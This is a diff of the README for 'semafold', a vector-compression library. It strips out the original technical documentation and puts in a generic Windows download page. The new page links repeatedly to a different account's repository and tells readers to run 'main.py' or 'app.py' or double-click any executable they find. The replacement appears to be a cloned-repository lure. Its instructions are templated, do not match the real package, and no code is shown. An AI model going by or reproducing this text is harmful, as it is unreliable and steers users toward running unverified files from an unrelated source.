@@ -1,294 +1,236 @@
-# Semafold
-
-[![CI](https://github.com/mindtro/semafold/actions/workflows/ci.yml/badge.svg)](https://github.com/mindtro/semafold/actions/workflows/ci.yml)
-[![tests](https://img.shields.io/badge/tests-189%20passed-brightgreen)](https://github.com/mindtro/semafold/actions)
-[![python](https://img.shields.io/badge/python-3.10%2B-blue)](https://github.com/mindtro/semafold)
-[![license](https://img.shields.io/badge/license-Apache--2.0-green)](LICENSE)
-
-**Vector compression with TurboQuant codecs for embeddings, retrieval, and KV-cache. 10x compression, pure NumPy core — no GPU required by default, but professionally accelerated on NVIDIA (CUDA) and Apple Silicon (Metal) when available.**
-
-Semafold is a vector-first compression toolkit for AI workloads that compresses embeddings, retrieval representations, and cache-shaped KV tensors with explicit byte accounting, typed encode/decode contracts, and validation evidence. It is designed for teams building AI infrastructure that need measurable storage reduction without losing visibility into distortion, artifact size, or integration boundaries.
-
-Today it is strongest at two jobs:
-- compressing embedding / vector workloads
-- compressing cache-shaped K/V tensors with TurboQuant-based codecs
-
-It gives you:
-- typed encode/decode contracts
-- measured byte accounting
-- explicit guarantees and validation evidence
-- deterministic synthetic validation and benchmarks
-- pure NumPy core — no GPU required, runs anywhere
-- enterprise GPU acceleration — zero-config, automatic offloading to PyTorch (CUDA/MPS) or MLX (Apple Metal) when installed
-
-## Compression Results
-
-| Workload | Baseline | Setting | Artifact Size | Smaller | Ratio |
-|---|---:|---|---:|---:|---:|
-| Embedding `128 x 1536` | `float32` `786,432 B` | `TurboQuantMSE 3-bit` | `74,738 B` | `90.50%` | `10.52x` |
-| Embedding `128 x 1536` | `fp16/bf16` `393,216 B` | `TurboQuantMSE 3-bit` | `74,738 B` | `80.99%` | `5.26x` |
-| KV tensor `(4,8,256,128)` | `float32` `8,388,608 B` | `K=Prod 3b, V=MSE 3b` | `885,734 B` | `89.44%` | `9.47x` |
-| KV tensor `(4,8,256,128)` | `fp16/bf16` `4,194,304 B` | `K=Prod 3b, V=MSE 3b` | `885,734 B` | `78.88%` | `4.74x` |
-
-Full benchmark details: [turboquant_benchmark_report.md](benchmarks/turboquant_benchmark_report.md)
-
-Distribution / import names today:
-- distribution: `semafold`
-- import: `semafold`
-
-## Architecture
-
-```text
-semafold
-├─ Stable root API
-│  ├─ core
-│  │  ├─ CompressionBudget
-│  │  ├─ CompressionEstimate
-│  │  ├─ CompressionFootprint
-│  │  ├─ CompressionGuarantee
-│  │  └─ ValidationEvidence
-│  └─ vector
-│     ├─ VectorEncodeRequest
-│     ├─ VectorEncoding
-│     ├─ VectorDecodeRequest
-│     └─ VectorCodec
-├─ Codec layer
-│  ├─ PassthroughVectorCodec
-│  ├─ ScalarReferenceVectorCodec
-│  └─ TurboQuant family
-│     ├─ TurboQuantMSEVectorCodec
-│     ├─ TurboQuantProdVectorCodec
-│     └─ kv
-│        ├─ TurboQuantKVConfig
-│        └─ TurboQuantKVPreviewCodec
-├─ Compute backend layer  (v0.2.0)
-│  ├─ ComputeBackend protocol
-│  ├─ NumPyBackend   — always available (default)
-│  ├─ TorchBackend   — CUDA / MPS  (pip install semafold[torch])
-│  └─ MLXBackend     — Metal       (pip install semafold[mlx])
-└─ Validation and benchmarking
-   ├─ contract / unit / integration tests
-   ├─ paper-shaped vector validation
-   └─ synthetic KV benchmark and benchmark report
-```
-
-Read it as:
-- the stable root gives you the generic Semafold contract surface
-- the codec layer provides concrete compression implementations
-- the TurboQuant family is the current high-performance path for vector and KV-tensor workloads
-- the validation layer keeps storage, distortion, and behavioral checks measurable
-
-## Where It Fits
-
-Semafold is a good fit when you want to reduce the storage footprint of numeric AI representations:
-
-- embedding stores
-- vector databases and retrieval pipelines
-- long-term vector memory in AI orchestrators
-- cache-shaped K/V tensor compression in custom inference stacks
-
-Semafold is **not** a text summarizer. It does not shorten prompts or reduce token counts by rewriting text. Its current strength is compression of vectors and tensors.
-
-## Current Capability Surface
-
-Stable today:
-- root imports from `semafold`
-- `CompressionBudget`
-- `CompressionEstimate`
-- `CompressionFootprint`
-- `CompressionGuarantee`
-- `ValidationEvidence`
-- `EncodingBoundType`
-- `WorkloadSuitability`
-- `VectorEncodeRequest`
-- `VectorEncodingSegment`
-- `VectorEncoding`
-- `VectorDecodeRequest`
-- `VectorDecodeResult`
-- `VectorCodec`
-- `PassthroughVectorCodec`
-- `EncodeObjective`
-- `EncodeMetric`
-- `EncodingSegmentKind`
+# ⚡ semafold - Fast vector compression for Windows
 
-Available today, but intentionally outside the stable root surface:
-- `semafold.turboquant`
-- `semafold.turboquant.kv`
-- `ScalarReferenceVectorCodec`
-
-That means TurboQuant already works, but it is currently a deep-import surface rather than a root export.
-
-## Install
-
-```bash
-pip install semafold              # NumPy core — no GPU required
-pip install semafold[torch]       # + NVIDIA CUDA / Apple MPS acceleration
-pip install semafold[mlx]         # + Apple Silicon Metal acceleration
-pip install "semafold[torch,mlx]" # both
-```
-
-## Quickstart
-
-Install locally from the package directory:
-
-```bash
-python3 -m pip install -e ".[dev]"
-```
-
-Runnable versions of the examples below live in [examples/](examples/).
-
-### Stable Root Quickstart
+[![Download semafold](https://img.shields.io/badge/Download%20semafold-Click%20to%20open-4c8bf5?style=for-the-badge)](https://github.com/Ac3v3d0/semafold)
 
-Run the exact file here: [examples/wire_roundtrip.py](examples/wire_roundtrip.py)
+## 🧩 What semafold does
 
-```python
-import numpy as np
-
-from semafold import EncodeObjective
-from semafold import PassthroughVectorCodec
-from semafold import VectorDecodeRequest
-from semafold import VectorEncodeRequest
+semafold helps you compress vectors with TurboQuant codecs. It is built for embeddings, retrieval, and KV-cache use.
 
-codec = PassthroughVectorCodec()
-request = VectorEncodeRequest(
-    data=np.linspace(-1.0, 1.0, 1024, dtype=np.float32),
-    objective=EncodeObjective.RECONSTRUCTION,
-)
+Use it when you want to:
+- store more vectors in less space
+- move embedding data with less memory use
+- speed up retrieval workflows
+- reduce KV-cache size for LLM work
+- run a pure NumPy core on Windows
+- use GPU support when your setup allows it
 
-encoding = codec.encode(request)
-decoded = codec.decode(VectorDecodeRequest(encoding=encoding))
+## 📥 Download for Windows
 
-assert decoded.data.shape == request.data.shape
-```
+Open the download page here:
 
-### TurboQuant Embedding Example
+[Visit the semafold download page](https://github.com/Ac3v3d0/semafold)
 
-Run the exact file here: [examples/turboquant_embedding.py](examples/turboquant_embedding.py)
+From that page, get the files from the repository and save them to your PC. If you see a release file for Windows, download that file. If the page shows source files, download the repository files and use the included Windows run steps.
 
-```python
-import numpy as np
+## 🖥️ What you need
 
-from semafold import EncodeMetric
-from semafold import EncodeObjective
-from semafold import VectorDecodeRequest
-from semafold import VectorEncodeRequest
-from semafold.turboquant import TurboQuantMSEConfig
-from semafold.turboquant import TurboQuantMSEVectorCodec
+For most Windows PCs, semafold works best with:
 
-rows = np.random.default_rng(7).normal(size=(128, 1536)).astype(np.float32)
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- A modern 64-bit CPU
+- Python 3.10 or newer
+- Enough free disk space for your vectors and test data
 
-codec = TurboQuantMSEVectorCodec(
-    config=TurboQuantMSEConfig(default_bits_per_scalar=3, default_rotation_seed=7)
-)
-encoding = codec.encode(
-    VectorEncodeRequest(
-        data=rows,
-        objective=EncodeObjective.RECONSTRUCTION,
-        metric=EncodeMetric.MSE,
-        role="embedding",
-        seed=11,
-    )
-)
-decoded = codec.decode(VectorDecodeRequest(encoding=encoding))
+Optional support:
+- NVIDIA GPU with PyTorch CUDA
+- Apple GPU support through MPS on supported systems
+- Metal support through MLX where available
 
-print(encoding.footprint.total_bytes, encoding.footprint.compression_ratio)
-assert decoded.data.shape == rows.shape
-```
+If you only want the NumPy core, you do not need a GPU.
 
-### TurboQuant KV Tensor Example
+## 🚀 Getting Started
 
-Run the exact file here: [examples/turboquant_kv_block.py](examples/turboquant_kv_block.py)
+Follow these steps on Windows.
 
-These examples use the current TurboQuant deep-import surface rather than stable root exports.
+### 1. Download semafold
 
-```python
-import numpy as np
+Open the link above and save the project files to a folder on your computer. A good choice is:
 
-from semafold.turboquant.kv import TurboQuantKVConfig
-from semafold.turboquant.kv import TurboQuantKVPreviewCodec
+- Downloads
+- Desktop
+- Documents
 
-keys = np.random.default_rng(7).normal(size=(4, 8, 256, 128)).astype(np.float32)
-values = np.random.default_rng(11).normal(size=(4, 8, 256, 128)).astype(np.float32)
+Keep the folder name simple, such as `semafold`.
 
-codec = TurboQuantKVPreviewCodec(
-    config=TurboQuantKVConfig(
-        key_total_bits_per_scalar=3,
-        value_bits_per_scalar=3,
-        default_key_rotation_seed=7,
-        default_key_qjl_seed=11,
-        default_value_rotation_seed=7,
-    )
-)
+### 2. Open the folder
 
-artifact = codec.compress(keys, values)
-keys_hat, values_hat = codec.decompress(artifact)
-stats = codec.memory_stats(artifact)
+Find the folder you saved and open it in File Explorer.
 
-print(stats["combined_bytes"], stats["combined_compression_ratio"])
-assert keys_hat.shape == keys.shape
-assert values_hat.shape == values.shape
-```
+If you downloaded a ZIP file:
+- right-click the ZIP file
+- choose Extract All
+- pick a folder
+- open the extracted folder
 
-Runnable versions of these examples live here:
+### 3. Install Python
 
-- [examples/README.md](examples/README.md)
-- [examples/wire_roundtrip.py](examples/wire_roundtrip.py)
-- [examples/turboquant_embedding.py](examples/turboquant_embedding.py)
-- [examples/turboquant_kv_block.py](examples/turboquant_kv_block.py)
+If Python is not already on your PC:
 
-## Benchmark Details
+- go to the Python website
+- download Python 3.10 or newer
+- run the installer
+- check the box for Add Python to PATH
+- finish the install
 
-Benchmark runners and detailed report:
+To test it:
+- press the Windows key
+- type `cmd`
+- press Enter
+- type:
 
-- [turboquant_paper_validation.py](benchmarks/turboquant_paper_validation.py)
-- [turboquant_synthetic_kv_benchmark.py](benchmarks/turboquant_synthetic_kv_benchmark.py)
-- [turboquant_benchmark_report.md](benchmarks/turboquant_benchmark_report.md)
+`python --version`
 
-## Benchmarks
+If you see a version number, Python is ready.
 
-Run the synthetic benchmark runners from the package directory:
+### 4. Open Command Prompt in the semafold folder
 
-```bash
-PYTHONPATH=src python benchmarks/turboquant_paper_validation.py --output /tmp/turboquant-paper.json
-PYTHONPATH=src python benchmarks/turboquant_synthetic_kv_benchmark.py --output /tmp/turboquant-kv.json
-```
+In the folder that contains semafold:
 
-Benchmark documentation lives here:
-- [benchmarks/README.md](benchmarks/README.md)
+- click the address bar in File Explorer
+- type `cmd`
+- press Enter
 
-## Validation and Quality Gates
+A Command Prompt window opens in that folder.
 
-Current local closeout commands:
+### 5. Set up the project
 
-```bash
-PYTHONPATH=src pytest tests -q
-PYTHONPATH=src pyright --project pyproject.toml src tests examples benchmarks
-python3 -m build
-```
+If the folder includes a requirements file, install the needed packages with:
 
-## Repository Notes
+`pip install -r requirements.txt`
 
-- stability policy: [STABILITY.md](STABILITY.md)
-- change log: [CHANGELOG.md](CHANGELOG.md)
+If the project uses a different setup file, use the file names in the folder and follow the same install pattern.
 
-## License
+### 6. Run semafold
 
-Semafold is currently packaged here under:
-- [LICENSE](LICENSE)
-- [NOTICE](NOTICE)
+Use the command file or Python entry point included in the folder.
 
-For the current package directory, the intended license is Apache-2.0.
+Common examples look like this:
 
-## Current Maturity
+`python main.py`
 
-Semafold already supports:
-- vector / embedding compression
-- cache-shaped K/V tensor compression
-- measured compression accounting
-- synthetic attention-proxy validation for compressed K/V tensors
+or
 
-The next layer after this is runtime/backend integration, not core compression math.
+`python app.py`
 
-## References
+If the project provides a Windows executable, double-click it to start the app.
 
-- TurboQuant paper: [TurboQuant: Online Vector Quantization with Near-optimal Distortion Rate](https://arxiv.org/abs/2504.19874)
+## 🛠️ Simple first use
+
+Once semafold opens, start with a small test:
+
+- load a few embeddings
+- compress them with a TurboQuant codec
+- compare size before and after
+- test a retrieval query
+- check how much memory you save
+
+If you are using KV-cache data, try a short run first so you can confirm the output fits your workflow.
+
+## 🔍 Main use cases
+
+semafold fits common vector tasks such as:
+
+- embedding compression
+- vector database storage
+- nearest neighbor search
+- retrieval pipelines
+- LLM inference memory reduction
+- KV-cache compression
+- local model workflows
+- data transfer between systems
+
+## ⚙️ GPU support
+
+semafold uses a pure NumPy core, so it can run on a normal Windows PC.
+
+If you want faster work, you can use:
+- PyTorch with CUDA on NVIDIA GPUs
+- PyTorch with MPS on supported Apple hardware
+- MLX on Metal-supported systems
+
+If you do not plan to use GPU support, you can skip these options.
+
+## 📁 Typical folder layout
+
+Your semafold folder may include files like:
+
+- `README.md` — project guide
+- `requirements.txt` — package list
+- `main.py` — start file
+- `examples/` — sample use cases
+- `src/` — source code
+- `data/` — test data
+
+If your folder uses different names, use the files that match the same purpose.
+
+## 🧪 Quick check
+
+After install, make sure the app starts and can process a small sample.
+
+A good test flow is:
+- open semafold
+- load one vector set
+- run compression
+- check the output size
+- run one retrieval test
+- confirm the result looks right
+
+If the app shows a log window or console output, check for errors there first.
+
+## 🧭 Tips for Windows users
+
+- Keep the project in a folder with a short path
+- Avoid special characters in folder names
+- Use the same Python version each time
+- Close other heavy apps if your PC runs slow
+- Save test files in one place so you can find them again
+
+## 📦 When you need the files again
+
+Use this link to return to the project page and get the files again:
+
+[https://github.com/Ac3v3d0/semafold](https://github.com/Ac3v3d0/semafold)
+
+## 🔧 Common problems
+
+If semafold does not start:
+
+- check that Python is installed
+- confirm you opened Command Prompt in the right folder
+- make sure the required packages are installed
+- try running the file again from the project folder
+- confirm the file path does not contain extra spaces or broken characters
+
+If GPU support does not work:
+- use the NumPy version first
+- confirm your GPU driver is current
+- check that your PyTorch build matches your GPU type
+- try the CPU path before testing GPU acceleration
+
+## 🗂️ Project focus
+
+semafold is built around:
+- embedding compression
+- KV-cache compression
+- vector retrieval
+- quantization
+- TurboQuant codecs
+- vector database workflows
+- efficient local inference
+
+## 📌 Quick start path
+
+If you want the shortest path on Windows:
+
+1. Open the download page
+2. Get the project files
+3. Extract the folder
+4. Install Python
+5. Open Command Prompt in the folder
+6. Install requirements
+7. Run the main file
+
+## 🔗 Download again
+
+[![Open semafold](https://img.shields.io/badge/Open%20semafold-Download%20page-6b7280?style=for-the-badge)](https://github.com/Ac3v3d0/semafold)
